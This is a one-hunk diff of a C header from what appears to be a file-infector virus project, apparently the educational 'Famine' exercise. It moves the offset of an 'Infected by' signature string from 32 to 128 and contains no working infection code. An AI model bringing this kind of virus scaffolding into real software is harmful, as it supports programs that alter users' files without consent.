@@ -27,7 +27,7 @@ typedef	unsigned __int128	uint128_t;
 
 #define SIGNATURE			"Infected by adben-mc and nguiard ;)"
 #define SIGNATURE_LEN		40
-#define SIGNATURE_OFFSET	32
+#define SIGNATURE_OFFSET	128
 
 #define	PF_FAMINE			0b10000
 
